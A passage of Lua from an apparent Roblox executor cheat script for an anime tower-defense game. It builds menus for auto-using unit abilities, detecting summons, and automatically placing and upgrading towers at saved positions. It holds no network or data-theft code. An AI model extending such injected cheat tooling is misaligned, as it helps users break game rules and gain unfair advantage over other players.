                                                store[soulAbilityName].useOnWave = cfg.useOnWave
                                                
                                                getgenv().SaveConfig(getgenv().Config)
                                            end,
                                            defaultValue
                                        )
                                        
                                        local waveFlag = unitName .. "_" .. soulAbilityName .. "_Wave"
                                        local waveDefault = ""
                                        if cfg.specificWave then
                                            waveDefault = tostring(cfg.specificWave)
                                        elseif getgenv().Config.inputs[waveFlag] and getgenv().Config.inputs[waveFlag] ~= "" then
                                            waveDefault = tostring(getgenv().Config.inputs[waveFlag])
                                        end
                                        
                                        createInput(
                                            targetSection,
                                            "  > Wave Number",
                                            waveFlag,
                                            "Required if 'On Wave' selected",
                                            "Numeric",
                                            function(text)
                                                local num = tonumber(text)
                                                cfg.specificWave = num
                                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                                getgenv().Config.abilities[unitName][soulAbilityName] = getgenv().Config.abilities[unitName][soulAbilityName] or {}
                                                getgenv().Config.abilities[unitName][soulAbilityName].specificWave = num
                                                getgenv().SaveConfig(getgenv().Config)
                                            end,
                                            waveDefault
                                        )
                                    else
                                        debugPrint("[Soul Check] Soul not equipped")
                                    end
                                else
                                    debugPrint("[Soul Check] UnitID not found")
                                end
                            else
                                debugPrint("[Soul Check] Missing data")
                            end
                        end)
                        
                        if not success then
                            warn("[Soul Check] Error:", err)
                        end
                    end
                end
            end
    end)
    
    if not success then
        warn("[Auto Ability UI] build failed: " .. tostring(err))
    end
    
    pcall(function()
        local clientData = getClientData()
        if clientData and clientData.Slots then
            local hasBulma = false
            for _, slotName in ipairs({"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}) do
                local slotData = clientData.Slots[slotName]
                if slotData and slotData.Value == "Bulma" then
                    hasBulma = true
                    break
                end
            end
            
            local hasBulma = false
            local hasWukong = false
            local hasSkeletonKnightEZA = false
            
            for _, slotName in ipairs({"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}) do
                local slotData = clientData.Slots[slotName]
                if slotData and slotData.Value then
                    if slotData.Value == "Bulma" then
                        hasBulma = true
                    elseif slotData.Value == "JinMoriGodly" then
                        hasWukong = true
                    elseif slotData.Value == "Skull_Knight_Evo" and slotData.UnitID then
                        if clientData.UnitData and clientData.UnitData[slotData.UnitID] then
                            if clientData.UnitData[slotData.UnitID].EZA == true then
                                hasSkeletonKnightEZA = true
                            end
                        elseif clientData[slotData.UnitID] then
                            if clientData[slotData.UnitID].EZA == true then
                                hasSkeletonKnightEZA = true
                            end
                        end
                    end
                end
            end
            
            local hasEtoEvo = false
            for slotName, slotData in pairs(clientData.Slots) do
                if slotData.Value == "EtoEvo" then
                    hasEtoEvo = true
                    break
                end
            end
            
            local hasGriffithEclipse = false
            for slotName, slotData in pairs(clientData.Slots) do
                if slotData.Value == "GriffithEclipse" then
                    hasGriffithEclipse = true
                    break
                end
            end
            
            local hasAlucardEvo = false
            for slotName, slotData in pairs(clientData.Slots) do
                if slotData.Value == "Alucard2Evo" then
                    hasAlucardEvo = true
                    break
                end
            end
            
            local specialSection = Tabs.Abilities:Section({ Side = "Left" })
            table.insert(getgenv()._AbilityUIElements["Left"], specialSection)
            
            specialSection:Header({ Text = "🔮 Auto Units" })
            specialSection:SubLabel({ Text = "Toggles work when units are equipped" })
            specialSection:Divider()
            
            do
                    createToggle(
                        specialSection,
                        "Bulma Auto-Wish",
                        "BulmaToggle",
                        function(value)
                            getgenv().BulmaEnabled = value
                            Window:Notify({
                                Title = "Bulma Auto-Wish",
                                Description = value and "Enabled" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().BulmaEnabled
                    )
                    
                    
                    createDropdown(
                        specialSection,
                        "  > Wish Type",
                        "BulmaWishType",
                        {"Power", "Wealth", "Time"},
                        false,
                        function(value)
                            getgenv().BulmaWishType = value
                            Window:Notify({
                                Title = "Bulma Auto-Wish",
                                Description = "Wish type set to: " .. value,
                                Lifetime = 2
                            })
                        end,
                        getgenv().BulmaWishType or "Power"
                    )
                end
                
                specialSection:Divider()
                
                do
                    createToggle(
                        specialSection,
                        "Auto Wukong (Jin Mori)",
                        "WukongToggle",
                        function(value)
                            getgenv().WukongEnabled = value
                            Window:Notify({
                                Title = "Auto Wukong",
                                Description = value and "Enabled" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().WukongEnabled
                    )
                end
                
                specialSection:Divider()
                
                do
                    createToggle(
                        specialSection,
                        "Auto Skeleton Knight (Savior)",
                        "SkeletonKnightToggle",
                        function(value)
                            getgenv().SkeletonKnightEnabled = value
                            Window:Notify({
                                Title = "Auto Skeleton Knight",
                                Description = value and "Enabled" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().SkeletonKnightEnabled
                    )
                    
                    specialSection:SubLabel({ Text = "Select target from placed towers (auto-updates every 5s)" })
                    
                    local function getAvailableTargets()
                        local targets = {}
                        
                        local towers = workspace:FindFirstChild("Towers")
                        if towers then
                            for _, tower in pairs(towers:GetChildren()) do
                                local owner = tower:FindFirstChild("Owner")
                                if owner and owner.Value == LocalPlayer then
                                    local towerName = tower.Name
                                    
                                    if towerName ~= "Skull_Knight_EvoEZA" and towerName ~= "Skull_Knight_Evo" and towerName ~= "NarutoBaryonClone" then
                                        local baseName = towerName:gsub("EZA$", "")
                                        local displayName = getUnitDisplayName(baseName)
                                        
                                        local alreadyExists = false
                                        for _, existing in ipairs(targets) do
                                            if existing == displayName then
                                                alreadyExists = true
                                                break
                                            end
                                        end
                                        
                                        if not alreadyExists then
                                            table.insert(targets, displayName)
                                        end
                                    end
                                end
                            end
                        end
                        
                        table.sort(targets)
                        
                        if #targets == 0 then
                            table.insert(targets, "Place a unit first")
                        end
                        
                        return targets
                    end
                    
                    local targets = getAvailableTargets()
                    
                    
                    if not getgenv().SkeletonKnightTargetUnit or getgenv().SkeletonKnightTargetUnit == "" then
                        getgenv().SkeletonKnightTargetUnit = targets[1]
                    end
                    
                    local skeletonDropdown = createDropdown(
                        specialSection,
                        "  > Target Unit",
                        "SkeletonKnightTargetUnit",
                        targets,
                        false,
                        function(value)
                            getgenv().SkeletonKnightTargetUnit = value
                            Window:Notify({
                                Title = "Auto Skeleton Knight",
                                Description = "Target: " .. value,
                                Lifetime = 2
                            })
                        end,
                        getgenv().SkeletonKnightTargetUnit
                    )
                    
                    task.spawn(function()
                        while task.wait(5) do
                            if not skeletonDropdown then break end
                            pcall(function()
                                local newTargets = getAvailableTargets()
                                if #newTargets > 0 and newTargets[1] ~= "Place a unit first" then
                                    skeletonDropdown:ClearOptions()
                                    skeletonDropdown:InsertOptions(newTargets)
                                end
                            end)
                        end
                    end)
                end
                
                specialSection:Divider()
                
                do
                    createToggle(
                        specialSection,
                        "Auto True Dracula Hypnosis",
                        "AlucardHypnosisToggle",
                        function(value)
                            getgenv().AlucardHypnosisEnabled = value
                            Window:Notify({
                                Title = "Auto True Dracula Hypnosis",
                                Description = value and "Enabled" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().AlucardHypnosisEnabled
                    )
                    
                    specialSection:SubLabel({ Text = "Select target from placed towers (auto-updates every 5s)" })
                    
                    local function getAvailableTargetsAlucard()
                        local targets = {}
                        
                        local towers = workspace:FindFirstChild("Towers")
                        if towers then
                            for _, tower in pairs(towers:GetChildren()) do
                                local owner = tower:FindFirstChild("Owner")
                                if owner and owner.Value == LocalPlayer then
                                    local towerName = tower.Name
                                    
                                    if towerName ~= "Alucard2Evo" and towerName ~= "NarutoBaryonClone" then
                                        local baseName = towerName:gsub("EZA$", "")
                                        local displayName = getUnitDisplayName(baseName)
                                        
                                        local alreadyExists = false
                                        for _, existing in ipairs(targets) do
                                            if existing == displayName then
                                                alreadyExists = true
                                                break
                                            end
                                        end
                                        
                                        if not alreadyExists then
                                            table.insert(targets, displayName)
                                        end
                                    end
                                end
                            end
                        end
                        
                        table.sort(targets)
                        
                        if #targets == 0 then
                            table.insert(targets, "Place a unit first")
                        end
                        
                        return targets
                    end
                    
                    local targetsAlucard = getAvailableTargetsAlucard()
                    
                    if not getgenv().AlucardHypnosisTargetUnit or getgenv().AlucardHypnosisTargetUnit == "" then
                        getgenv().AlucardHypnosisTargetUnit = targetsAlucard[1]
                    end
                    
                    local alucardDropdown = createDropdown(
                        specialSection,
                        "  > Target Unit",
                        "AlucardHypnosisTargetUnit",
                        targetsAlucard,
                        false,
                        function(value)
                            getgenv().AlucardHypnosisTargetUnit = value
                            Window:Notify({
                                Title = "Auto True Dracula Hypnosis",
                                Description = "Target: " .. value,
                                Lifetime = 2
                            })
                        end,
                        getgenv().AlucardHypnosisTargetUnit
                    )
                    
                    task.spawn(function()
                        local lastTargets = {}
                        for _, v in ipairs(targetsAlucard) do
                            lastTargets[v] = true
                        end
                        
                        while task.wait(15) do
                            if not alucardDropdown then break end
                            pcall(function()
                                local newTargets = getAvailableTargetsAlucard()
                                if #newTargets > 0 and newTargets[1] ~= "Place a unit first" then
                                    local changed = false
                                    local newTargetsSet = {}
                                    for _, v in ipairs(newTargets) do
                                        newTargetsSet[v] = true
                                        if not lastTargets[v] then
                                            changed = true
                                        end
                                    end
                                    
                                    for k in pairs(lastTargets) do
                                        if not newTargetsSet[k] then
                                            changed = true
                                        end
                                    end
                                    
                                    if changed then
                                        local currentSelection = getgenv().AlucardHypnosisTargetUnit
                                        alucardDropdown:ClearOptions()
                                        alucardDropdown:InsertOptions(newTargets)
                                        
                                        if newTargetsSet[currentSelection] then
                                            alucardDropdown:UpdateSelection(currentSelection)
                                        else
                                            getgenv().AlucardHypnosisTargetUnit = newTargets[1]
                                            alucardDropdown:UpdateSelection(newTargets[1])
                                        end
                                        
                                        lastTargets = newTargetsSet
                                    end
                                end
                            end)
                        end
                    end)
                end
                
                specialSection:Divider()
                
                do
                    createToggle(
                        specialSection,
                        "Auto One Eye Devil (EtoEvo)",
                        "OneEyeDevilToggle",
                        function(value)
                            getgenv().OneEyeDevilEnabled = value
                            Window:Notify({
                                Title = "Auto One Eye Devil",
                                Description = value and "Enabled - Cycling Ocular Sigils" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().OneEyeDevilEnabled
                    )
                end
                
                specialSection:Divider()
                
                do
                    createToggle(
                        specialSection,
                        "Auto Griffith Light (Umbral Prince)",
                        "GriffithLightToggle",
                        function(value)
                            getgenv().GriffithLightEnabled = value
                            Window:Notify({
                                Title = "Auto Griffith Light",
                                Description = value and "Enabled - Will use Light Sacrifice at 50k+" or "Disabled",
                                Lifetime = 2
                            })
                        end,
                        getgenv().GriffithLightEnabled
                    )
                end
        end
    end)
    
    if not success then
        warn("[Ability UI] Build failed:", err)
        Window:Notify({
            Title = "Auto Ability Error",
            Description = "Failed to build UI. Check console for details.",
            Lifetime = 5
        })
    end
    
    getgenv()._AbilityUIBuilt = anyBuilt
    getgenv()._AbilityUIBuilding = false
end

task.spawn(function()
    task.wait(2 * MOBILE_DELAY_MULTIPLIER)
    local maxRetries, retryDelay = 10, 3 * MOBILE_DELAY_MULTIPLIER
    
    for i = 1, maxRetries do
        pcall(function()
            local cd = getClientData()
            if cd and cd.Slots then
                buildAutoAbilityUI()
            else
                if i <= 3 then
                    Window:Notify({
                        Title = "Auto Ability",
                        Description = "Loading units... (" .. i .. "/" .. maxRetries .. ")",
                        Lifetime = 2
                    })
                end
            end
        end)
        
        if getgenv()._AbilityUIBuilt then break end
        task.wait(retryDelay)
    end
    
    if not getgenv()._AbilityUIBuilt then
        pcall(function()
            local fallbackSection = Tabs.Abilities:Section({ Side = "Left" })
            fallbackSection:Header({ Text = "⚠️ No Units Found" })
            fallbackSection:SubLabel({ Text = "Make sure you have units equipped in your slots." })
            fallbackSection:Divider()
            fallbackSection:SubLabel({ Text = "If you do have units equipped, try:" })
            fallbackSection:SubLabel({ Text = "1. Rejoining the game" })
            fallbackSection:SubLabel({ Text = "2. Reloading the script" })
            fallbackSection:SubLabel({ Text = "3. Checking console for errors (F9)" })
        end)
    end
    
    task.spawn(function()
        local lastKnownUnits = {}
        local function getEquippedUnits()
            local units = {}
            local clientData = getClientData()
            if clientData and clientData.Slots then
                for slotName, slotData in pairs(clientData.Slots) do
                    if slotData and slotData.Value then
                        units[slotName] = slotData.Value
                    end
                end
            end
            return units
        end
        
        task.wait(10)
        lastKnownUnits = getEquippedUnits()
        
        while true do
            task.wait(5)
            
            local currentUnits = getEquippedUnits()
            local unitsChanged = false
            
            for slotName, unitName in pairs(currentUnits) do
                if lastKnownUnits[slotName] ~= unitName then
                    unitsChanged = true
                    break
                end
            end
            
            for slotName, unitName in pairs(lastKnownUnits) do
                if currentUnits[slotName] ~= unitName then
                    unitsChanged = true
                    break
                end
            end
            
            if unitsChanged then
                print("[Unit Change] Detected unit change, refreshing abilities...")
                
                getgenv()._AbilityUIBuilt = false
                getgenv()._AbilityUIBuilding = false
                
                pcall(function()
                    if getgenv()._AbilityUIElements then
                        for side, elements in pairs(getgenv()._AbilityUIElements) do
                            for _, element in ipairs(elements) do
                                if element and element.Remove then
                                    pcall(function() element:Remove() end)
                                elseif element and element.Destroy then
                                    pcall(function() element:Destroy() end)
                                end
                            end
                        end
                    end
                    getgenv()._AbilityUIElements = nil
                end)
                
                pcall(function()
                    if getgenv()._DynamicSummonSections then
                        for _, section in pairs(getgenv()._DynamicSummonSections) do
                            if section and section.Remove then
                                pcall(function() section:Remove() end)
                            elseif section and section.Destroy then
                                pcall(function() section:Destroy() end)
                            end
                        end
                        getgenv()._DynamicSummonSections = {}
                    end
                end)
                
                task.wait(2)
                buildAutoAbilityUI()
                
                lastKnownUnits = getEquippedUnits()
                
                Window:Notify({
                    Title = "Unit Change Detected",
                    Description = "Abilities refreshed automatically",
                    Lifetime = 3
                })
            end
        end
    end)
    
    task.spawn(function()
        task.wait(5)
        
        if not getgenv()._DynamicSummonSections then
            getgenv()._DynamicSummonSections = {}
        end
        
        local SUMMON_BLACKLIST = {
            "NarutoBaryonClone",
            "JinMoriGodlyClone",
            "Skull_Knight_EvoEZA"
        }
        
        local function isSummonBlacklisted(unitName)
            for _, blacklisted in ipairs(SUMMON_BLACKLIST) do
                if unitName == blacklisted then
                    return true
                end
            end
            return false
        end
        
        local function isSummonUnit(unitName)
            if isSummonBlacklisted(unitName) then
                return false
            end
            
            local clientData = getClientData()
            if not clientData or not clientData.Slots then return false end
            
            for _, slotData in pairs(clientData.Slots) do
                if slotData and slotData.Value == unitName then
                    return false
                end
            end
            
            return true
        end
        
        local trackedSummons = {}
        
        
        while true do
            task.wait(2)
            
            if not Tabs or not Tabs.Abilities then
                task.wait(5)
                continue
            end
            
            local towers = workspace:FindFirstChild("Towers")
            if not towers then
                task.wait(2)
                continue
            end
            
            local currentSummons = {}
            
            for _, tower in pairs(towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    local unitName = tower.Name
                    
                    if isSummonUnit(unitName) and not isSummonBlacklisted(unitName) then
                        currentSummons[unitName] = true
                        
                        if not trackedSummons[unitName] and not getgenv()._DynamicSummonSections[unitName] then
                            
                            local abilities = getAllAbilities(unitName)
                            
                            if next(abilities) then
                                local displayName = getUnitDisplayName(unitName)
                                
                                if not getgenv()._AbilityUIElements then
                                    getgenv()._AbilityUIElements = {Left = {}, Right = {}}
                                end
                                
                                local summonSection = Tabs.Abilities:Section({ Side = "Right" })
                                table.insert(getgenv()._AbilityUIElements["Right"], summonSection)
                                
                                local headerElement = summonSection:Header({ Text = "🔮 " .. displayName .. " (Summon)" })
                                local sublabelElement = summonSection:SubLabel({ Text = "Auto-detected summon unit" })
                                local dividerElement = summonSection:Divider()
                                
                                local sectionElements = {headerElement, sublabelElement, dividerElement}
                                
                                if not getgenv().UnitAbilities then getgenv().UnitAbilities = {} end
                                if not getgenv().UnitAbilities[unitName] then getgenv().UnitAbilities[unitName] = {} end
                                if not getgenv().Config.abilities then getgenv().Config.abilities = {} end
                                if not getgenv().Config.abilities[unitName] then getgenv().Config.abilities[unitName] = {} end
                                
                                local sortedAbilities = {}
                                for abilityName, data in pairs(abilities) do
                                    table.insert(sortedAbilities, { name = abilityName, data = data })
                                end
                                table.sort(sortedAbilities, function(a, b)
                                    local aLevel = (a.data and a.data.requiredLevel) or 0
                                    local bLevel = (b.data and b.data.requiredLevel) or 0
                                    return aLevel < bLevel
                                end)
                                
                                for _, ab in ipairs(sortedAbilities) do
                                    local abilityName = ab.name
                                    local abilityData = ab.data
                                    
                                    if not getgenv().UnitAbilities[unitName][abilityName] then
                                        local saved = getgenv().Config.abilities and 
                                                     getgenv().Config.abilities[unitName] and 
                                                     getgenv().Config.abilities[unitName][abilityName]
                                        
                                        getgenv().UnitAbilities[unitName][abilityName] = {
                                            enabled = (saved and saved.enabled) or false,
                                            onlyOnBoss = (saved and saved.onlyOnBoss) or false,
                                            specificWave = (saved and saved.specificWave) or nil,
                                            requireBossInRange = (saved and saved.requireBossInRange) or false,
                                            useOnWave = (saved and saved.useOnWave) or false
                                        }
                                    end
                                    
                                    local cfg = getgenv().UnitAbilities[unitName][abilityName]
                                    
                                    local cdText = abilityData.cooldown and ("CD: " .. abilityData.cooldown .. "s") or ""
                                    local globalText = abilityData.isGlobal and " (Global)" or ""
                                    
                                    local toggleElement = createToggle(
                                        summonSection,
                                        "⚡ " .. abilityName .. " (" .. cdText .. ")" .. globalText,
                                        unitName .. "_" .. abilityName .. "_Toggle",
                                        function(v)
                                            cfg.enabled = v
                                            getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                            getgenv().Config.abilities[unitName][abilityName] = getgenv().Config.abilities[unitName][abilityName] or {}
                                            getgenv().Config.abilities[unitName][abilityName].enabled = v
                                            getgenv().SaveConfig(getgenv().Config)
                                        end,
                                        cfg.enabled
                                    )
                                    table.insert(sectionElements, toggleElement)
                                end
                                
                                if not getgenv()._DynamicSummonSections then
                                    getgenv()._DynamicSummonSections = {}
                                end
                                
                                getgenv()._DynamicSummonSections[unitName] = {
                                    section = summonSection,
                                    elements = sectionElements
                                }
                                trackedSummons[unitName] = true
                                
                                Window:Notify({
                                    Title = "Summon Detected",
                                    Description = displayName .. " abilities added!",
                                    Lifetime = 3
                                })
                            end
                        end
                    end
                end
            end
            
            for unitName, _ in pairs(trackedSummons) do
                if not currentSummons[unitName] then
                    
                    if getgenv()._DynamicSummonSections and getgenv()._DynamicSummonSections[unitName] then
                        pcall(function()
                            local sectionData = getgenv()._DynamicSummonSections[unitName]
                            
                            if sectionData and sectionData.elements then
                                for _, element in ipairs(sectionData.elements) do
                                    pcall(function()
                                        if element and element.SetVisiblity then
                                            element:SetVisiblity(false)
                                        elseif element and element.SetVisibility then
                                            element:SetVisibility(false)
                                        end
                                    end)
                                end
                            end
                            
                            if sectionData and sectionData.section then
                                for i = #getgenv()._AbilityUIElements["Right"], 1, -1 do
                                    if getgenv()._AbilityUIElements["Right"][i] == sectionData.section then
                                        table.remove(getgenv()._AbilityUIElements["Right"], i)
                                        break
                                    end
                                end
                            end
                        end)
                        getgenv()._DynamicSummonSections[unitName] = nil
                    end
                    
                    if getgenv().UnitAbilities and getgenv().UnitAbilities[unitName] then
                        getgenv().UnitAbilities[unitName] = nil
                    end
                    
                    trackedSummons[unitName] = nil
                end
            end
        end
    end)
end)


getgenv().AutoPlayConfig = getgenv().AutoPlayConfig or {
    enabled = false,
    autoPlace = false,
    autoUpgrade = false,
    autoUpgradePriority = false,
    focusFarm = false,
    hologram = false,
    placeBeforeUpgrade = false,
    pathPercentage = 1,
    distanceFromPath = 0,
    placeCaps = {1, 1, 1, 1, 1, 1},
    upgradeCaps = {0, 0, 0, 0, 0, 0},
    upgradePriorities = {1, 2, 3, 4, 5, 6},
    autoPlaceAtPosition = false,
    positionHologram = false,
    unitPositions = {}
}

getgenv().Config.autoPlay = getgenv().Config.autoPlay or {}
getgenv().Config.autoPlay.unitPositions = getgenv().Config.autoPlay.unitPositions or {}

getgenv().AutoPlayConfig.autoPlace = getgenv().Config.toggles.AutoPlayPlace or false
getgenv().AutoPlayConfig.autoUpgrade = getgenv().Config.toggles.AutoPlayUpgrade or false
getgenv().AutoPlayConfig.autoUpgradePriority = getgenv().Config.toggles.AutoPlayUpgradePriority or false
getgenv().AutoPlayConfig.focusFarm = getgenv().Config.toggles.AutoPlayFocusFarm or false
getgenv().AutoPlayConfig.hologram = getgenv().Config.toggles.AutoPlayHologram or false
getgenv().AutoPlayConfig.placeBeforeUpgrade = getgenv().Config.toggles.AutoPlayPlaceBeforeUpgrade or false
getgenv().AutoPlayConfig.autoPlaceAtPosition = getgenv().Config.toggles.AutoPlayPlaceAtPosition or false
getgenv().AutoPlayConfig.positionHologram = getgenv().Config.toggles.AutoPlayPositionHologram or false
getgenv().AutoPlayConfig.pathPercentage = tonumber(getgenv().Config.inputs.AutoPlayPathPercentage) or 1
getgenv().AutoPlayConfig.distanceFromPath = tonumber(getgenv().Config.inputs.AutoPlayDistanceFromPath) or 0

for i = 1, 6 do
    if getgenv().Config.autoPlay.unitPositions[i] then
        local savedPos = getgenv().Config.autoPlay.unitPositions[i]
        getgenv().AutoPlayConfig.unitPositions[i] = Vector3.new(savedPos.X, savedPos.Y, savedPos.Z)
    end
end

for i = 1, 6 do
    local savedCap = tonumber(getgenv().Config.inputs["AutoPlayPlaceCap" .. i])
    if savedCap then
        getgenv().AutoPlayConfig.placeCaps[i] = savedCap
    end
end

for i = 1, 6 do
    local savedCap = tonumber(getgenv().Config.inputs["AutoPlayUpgradeCap" .. i])
    if savedCap then
        getgenv().AutoPlayConfig.upgradeCaps[i] = savedCap
    end
end

for i = 1, 6 do
    local savedPriority = tonumber(getgenv().Config.inputs["AutoPlayUpgradePriority" .. i])
    if savedPriority then
        getgenv().AutoPlayConfig.upgradePriorities[i] = savedPriority
    end
end

Sections.AutoPlayLeft:Header({ Text = "🤖 Auto Play" })
Sections.AutoPlayLeft:SubLabel({ Text = "Automated tower placement and upgrades" })

Sections.AutoPlayLeft:Divider()
Sections.AutoPlayLeft:Header({ Text = "📍 Placement Settings" })

createToggle(
    Sections.AutoPlayLeft,
    "Enable Auto Place",
    "AutoPlayPlace",
    function(value)
        getgenv().AutoPlayConfig.autoPlace = value
    end,
    getgenv().AutoPlayConfig.autoPlace
)

createToggle(
    Sections.AutoPlayLeft,
    "Enable Auto Place at Position",
    "AutoPlayPlaceAtPosition",
    function(value)
        getgenv().AutoPlayConfig.autoPlaceAtPosition = value
        
        if value then
            Window:Notify({
                Title = "Auto Place at Position",
                Description = "Will place units at saved positions. Make sure to save positions first!",
                Lifetime = 4
            })
        end
    end,
    getgenv().AutoPlayConfig.autoPlaceAtPosition
)

Sections.AutoPlayLeft:SubLabel({ Text = "Independent toggle - uses saved positions instead of path. No need to enable 'Auto Place'" })

Sections.AutoPlayLeft:Divider()
Sections.AutoPlayLeft:Header({ Text = "⬆️ Upgrade Settings" })

local autoUpgradeToggle, autoUpgradePriorityToggle

autoUpgradeToggle = createToggle(
    Sections.AutoPlayLeft,
    "Enable Auto Upgrade",
    "AutoPlayUpgrade",
    function(value)
        getgenv().AutoPlayConfig.autoUpgrade = value
        if value and getgenv().AutoPlayConfig.autoUpgradePriority then
            getgenv().AutoPlayConfig.autoUpgradePriority = false
            getgenv().Config.toggles.AutoPlayUpgradePriority = false
            saveConfig(getgenv().Config)
            if autoUpgradePriorityToggle then
                pcall(function() autoUpgradePriorityToggle:UpdateState(false) end)
            end
        end
    end,
    getgenv().AutoPlayConfig.autoUpgrade
)

autoUpgradePriorityToggle = createToggle(
    Sections.AutoPlayLeft,
    "Auto Upgrade Priority",
    "AutoPlayUpgradePriority",
    function(value)
        getgenv().AutoPlayConfig.autoUpgradePriority = value
        if value and getgenv().AutoPlayConfig.autoUpgrade then
            getgenv().AutoPlayConfig.autoUpgrade = false
            getgenv().Config.toggles.AutoPlayUpgrade = false
            saveConfig(getgenv().Config)
            if autoUpgradeToggle then
                pcall(function() autoUpgradeToggle:UpdateState(false) end)
            end
        end
    end,
    getgenv().AutoPlayConfig.autoUpgradePriority
)

createToggle(
    Sections.AutoPlayLeft,
    "Place Units before Upgrading",
    "AutoPlayPlaceBeforeUpgrade",
    function(value)
        getgenv().AutoPlayConfig.placeBeforeUpgrade = value
    end,
    getgenv().AutoPlayConfig.placeBeforeUpgrade
)

Sections.AutoPlayLeft:Divider()
Sections.AutoPlayLeft:Header({ Text = "⚙️ Additional Options" })

createToggle(
    Sections.AutoPlayLeft,
    "Focus Farm Units",
    "AutoPlayFocusFarm",
    function(value)
        getgenv().AutoPlayConfig.focusFarm = value
    end,
    getgenv().AutoPlayConfig.focusFarm
)

Sections.AutoPlayLeft:SubLabel({ Text = "Prioritize placing farm units first" })

createToggle(
    Sections.AutoPlayLeft,
    "Enable Hologram",
    "AutoPlayHologram",
    function(value)
        getgenv().AutoPlayConfig.hologram = value
    end,
    getgenv().AutoPlayConfig.hologram
)

Sections.AutoPlayLeft:SubLabel({ Text = "Show placement preview markers" })

Sections.AutoPlayLeft:Divider()
Sections.AutoPlayLeft:Header({ Text = "🎯 Path & Distance" })

local pathSlider
local function updatePathSliderMax()
    local waypoints = {}
    pcall(function()
        local waypointsFolder = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Waypoints")
        if waypointsFolder then
            for _, wp in pairs(waypointsFolder:GetChildren()) do
                if wp:IsA("BasePart") then
                    local num = tonumber(wp.Name)
                    if num and num >= 1 then
                        table.insert(waypoints, num)
                    end
                end
            end
        end
    end)
    
    local maxWaypoint = #waypoints > 0 and math.max(table.unpack(waypoints)) or 50
    
    if pathSlider then
        pcall(function()
            pathSlider:UpdateValue(math.min(getgenv().AutoPlayConfig.pathPercentage or 1, maxWaypoint))
        end)
    end
end

pathSlider = createSlider(
    Sections.AutoPlayLeft,
    "Path Waypoint",
    "AutoPlayPathPercentage",
    1,
    50,
    getgenv().AutoPlayConfig.pathPercentage or 1,
    function(value)
        getgenv().AutoPlayConfig.pathPercentage = value
    end,
    "Default",
    1
)

task.spawn(function()
    task.wait(2)
    updatePathSliderMax()
end)

createSlider(
    Sections.AutoPlayLeft,
    "Distance from Path",
    "AutoPlayDistanceFromPath",
    0,
    25,
    getgenv().AutoPlayConfig.distanceFromPath,
    function(value)
        getgenv().AutoPlayConfig.distanceFromPath = math.floor(value)
    end,
    "Default",
    0
)

Sections.AutoPlayLeft:SubLabel({ Text = "Only used when not in position mode" })

Sections.AutoPlayLeft:Divider()
Sections.AutoPlayLeft:Header({ Text = "📍 Custom Unit Positions" })
Sections.AutoPlayLeft:SubLabel({ Text = "Stand where you want each unit, then click Set Position" })

if not getgenv()._PositionHolograms then
    getgenv()._PositionHolograms = {}
end

if not getgenv().AutoPlayConfig.unitPositions then
    getgenv().AutoPlayConfig.unitPositions = {}
end

local function getUnitNameForSlot(slotIndex)
    local clientData = getClientData()
    if not clientData or not clientData.Slots then return nil end
    
    local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
    local slotData = clientData.Slots[sortedSlots[slotIndex]]
    
    if slotData and slotData.Value and slotData.Value ~= "" then
        return slotData.Value
    end
    
    return nil
end

local function updatePositionHologram(slotIndex)
    if not getgenv().AutoPlayConfig.positionHologram then return end
    
    pcall(function()
        if getgenv()._PositionHolograms[slotIndex] then
            if getgenv()._PositionHolograms[slotIndex].part then
                getgenv()._PositionHolograms[slotIndex].part:Destroy()
            end
            if getgenv()._PositionHolograms[slotIndex].beam then
                getgenv()._PositionHolograms[slotIndex].beam:Destroy()
            end
            getgenv()._PositionHolograms[slotIndex] = nil
        end
        
        local pos = getgenv().AutoPlayConfig.unitPositions[slotIndex]
        if pos then
            local part = Instance.new("Part")
            part.Size = Vector3.new(0.5, 0.5, 0.5)
            part.Position = pos + Vector3.new(0, 2, 0)
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 0.5
            part.Color = Color3.fromRGB(0, 255, 100)
            part.Material = Enum.Material.Neon
            part.Shape = Enum.PartType.Ball
            part.Parent = workspace
            
            local beam = Instance.new("Part")
            beam.Size = Vector3.new(0.2, 4, 0.2)
            beam.Position = pos
            beam.Anchored = true
            beam.CanCollide = false
            beam.Transparency = 0.6
            beam.Color = Color3.fromRGB(0, 255, 100)
            beam.Material = Enum.Material.Neon
            beam.Parent = workspace
            
            local billboard = Instance.new("BillboardGui")
            billboard.Size = UDim2.new(0, 120, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = part
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 0.3
            label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            
            local unitName = getUnitNameForSlot(slotIndex)
            if unitName then
                label.Text = unitName .. " (Slot " .. slotIndex .. ")"
            else
                label.Text = "Unit " .. slotIndex
            end
            
            label.TextColor3 = Color3.fromRGB(0, 255, 100)
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = billboard
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 4)
            corner.Parent = label
            
            getgenv()._PositionHolograms[slotIndex] = {
                part = part,
                beam = beam
            }
        end
    end)
end

createToggle(
    Sections.AutoPlayLeft,
    "Enable Position Hologram",
    "AutoPlayPositionHologram",
    function(value)
        getgenv().AutoPlayConfig.positionHologram = value
        if not value then
            if getgenv()._PositionHolograms then
                for _, hologramData in pairs(getgenv()._PositionHolograms) do
                    pcall(function()
                        if hologramData.part then hologramData.part:Destroy() end
                        if hologramData.beam then hologramData.beam:Destroy() end
                    end)
                end
                getgenv()._PositionHolograms = {}
            end
        else
            task.spawn(function()
                if not getgenv()._PositionHolograms then
                    getgenv()._PositionHolograms = {}
                end
                for i = 1, 6 do
